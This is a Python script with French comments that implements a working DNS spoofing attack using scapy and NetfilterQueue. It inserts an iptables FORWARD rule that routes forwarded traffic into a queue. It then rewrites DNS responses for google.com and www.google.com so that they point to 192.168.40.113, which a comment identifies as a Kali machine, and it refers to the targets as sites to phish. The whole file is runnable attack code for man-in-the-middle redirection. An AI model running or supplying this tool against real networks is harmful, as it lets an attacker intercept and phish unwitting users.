from scapy.all import *
from netfilterqueue import NetfilterQueue
import os

# enregistrements hosts DNS, ici on veut usurper google.com
dns_hosts = {
    b"google.com.": "192.168.40.113", # change this
    b"www.google.com.": "192.168.40.113", # this too
}

def process_packet(packet):
    """
    Chaque fois qu'un nouveau paquet est redirigé vers netfilter queue,
    ce callback est appelé.
    """
    # convertis un paquet de netfilter queue en paquet scapy
    scapy_packet = IP(packet.get_payload())
    if scapy_packet.haslayer(DNSRR):
        # Si le paquet est DNS : on le modifie
        print("[BEFORE]:", scapy_packet.summary())
        try:
            scapy_packet = modify_packet(scapy_packet)
        except IndexError:
            # pas de paquet UDP, il peut s'agir de paquets d'erreur IP/UDP.
            pass
        print("[AFTER]:", scapy_packet.summary())
        # renvoyé comme paquet de netfilter queue
        packet.set_payload(bytes(scapy_packet))
    # accepte le paquet
    packet.accept()

def modify_packet(packet):
    """
    Modifie la réponse DNS pour la faire correspondre à notre dico `dns_hosts`
    Par exemple, lorsqu'on a une réponse de google.com, cette fonction remplace 
    l'adresse IP réelle par une fausse adresse IP (192.168.40.113).
    """
    # Obtenir le nom de domaine de la requête DNS
    qname = packet[DNSQR].qname
    if qname not in dns_hosts:
        # Si le site n'est pas dans notre liste de sites à phisher, on n'y touche pas
        print("NO MODIF", qname)
        return packet
    # créer une nouvelle réponse, en remplaçant la réponse originale
    # définir les rdata pour l'IP que nous voulons rediriger (spoofed)
    # google.com -> 192.168.40.113 (machine kali)
    packet[DNS].an = DNSRR(rrname=qname, rdata=dns_hosts[qname])
    # définir le nombre de réponses à 1
    packet[DNS].ancount = 1
    # supprimer les sommes de contrôle et la longueur du paquet, parce que nous avons modifié le paquet
    # de nouveaux calculs sont nécessaires (scapy le fera automatiquement)
    del packet[IP].len
    del packet[IP].chksum
    del packet[UDP].len
    del packet[UDP].chksum
    # retourne le paquet modifié
    return packet



if __name__ == "__main__":
    QUEUE_NUM = 0
    # insérer la règle iptables FORWARD
    os.system("iptables -I FORWARD -j NFQUEUE --queue-num {}".format(QUEUE_NUM))
    # instancie netfilter queue
    queue = NetfilterQueue()
    try:
        # lier le queue number à notre callback `process_packet`.
        # et le lancer
        queue.bind(QUEUE_NUM, process_packet)
        queue.run()
    except KeyboardInterrupt:
        # fin du programme on fait iptables flush
        os.system("iptables --flush")
